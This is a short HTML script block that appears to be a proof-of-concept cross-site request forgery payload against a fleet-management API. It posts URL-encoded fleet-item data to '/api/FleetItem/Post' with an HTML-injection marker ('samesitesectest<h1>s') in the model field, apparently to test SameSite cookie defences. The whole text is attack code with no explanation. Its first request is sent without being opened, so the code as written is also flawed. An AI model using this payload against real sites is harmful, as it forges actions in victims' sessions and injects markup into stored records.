<script> 
var req = new XMLHttpRequest(); 
req.onload = handleResponse; 
req.send();
 
function handleResponse() { 
     var changeReq = new XMLHttpRequest(); 
     changeReq.open('post', '/api/FleetItem/Post', true); 
     changeReq.send('values=%7B%22Idstato%22%3A1%2C%22Modello%22%3A%22samesitesectest%3Ch1%3Es%22%2C%22Idutilizzatore%22%3A%22100%22%2C%22Idworkgroup%22%3A4%2C%22Idfornitore%22%3A1%7D') }; </script>
